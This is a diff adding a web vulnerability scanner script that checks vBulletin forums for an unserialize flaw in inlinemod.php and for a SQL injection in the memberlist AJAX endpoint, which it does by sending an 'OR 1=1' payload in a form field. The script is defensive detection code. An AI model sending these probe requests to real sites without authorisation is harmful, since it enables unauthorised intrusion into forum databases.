@@ -1,0 +1,75 @@
+#include helpers.inc;
+#include reporting_helpers.inc;
+// **************************************************************************************							 
+function alert(uri, vxml, job, details)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = uri;
+	ri.alertPath = "Scripts/" + vxml; 	
+	ri.setHttpInfo(job);
+	
+	if (details) ri.details = details;
+	addHTTPJobToCrawler(job, 1, 1);
+	
+	AddReportItem(ri);	
+}							 			
+/***********************************************************************************/
+function test_vb3_unserialize(dir, uri)
+{
+	//trace(uri);
+	lastJob = new THTTPJob();
+	lastJob.verb = "POST";
+	lastJob.url  = dir.url;
+	lastJob.uri  = uri + '/inlinemod.php';		
+	lastJob.request.addHeader("Content-Type", "application/x-www-form-urlencoded", true);
+	lastJob.request.body = 'forumid=&s=&securitytoken=guest&url=';
+	
+	lastJob.execute();
+	
+	if (!lastJob.wasError && !lastJob.notFound) 
+	{
+		if (lastJob.responseStatus == 200 && lastJob.response.body.match(/name="postvars" value="[a-zA-Z0-9]{40}a:\d:{/))
+		{
+				// successful
+				alert(uri, 'vBulletin_security_exploit_unserialize.xml', lastJob);
+				return true;				
+		}
+	}		
+	
+	return false;
+}
+/***********************************************************************************/
+function test_vb512_memberlist_sqlinjection(dir, uri)
+{
+	//trace(uri);
+	lastJob = new THTTPJob();
+	lastJob.verb = "POST";
+	lastJob.url  = dir.url;
+	lastJob.uri  = uri + '/ajax/render/memberlist_items';		
+	lastJob.request.addHeader("Content-Type", "application/x-www-form-urlencoded", true);
+	lastJob.request.body = 'criteria[perpage]=10&criteria[startswith]=zzzzzzzzzzzzzzzzzzzzzz873489734" OR 1=1-- " &criteria[sortfield]=username&criteria[sortorder]=asc&securitytoken=guest';
+	
+	lastJob.execute();
+	
+	if (!lastJob.wasError && !lastJob.notFound) 
+	{
+		if (lastJob.responseStatus == 200 && lastJob.response.body.indexOf("b-memberlist__member-details") != -1)
+		{
+				// successful
+				alert(uri, 'vBulletin_512_SQL_Injection.xml', lastJob);
+				return true;				
+		}
+	}		
+	
+	return false;
+}
+/***********************************************************************************/
+/* main */
+/***********************************************************************************/	
+var dir = getCurrentDirectory(); 
+if (dir)
+{
+	test_vb3_unserialize(dir, dir.fullPath);
+	test_vb512_memberlist_sqlinjection(dir, dir.fullPath);
+}
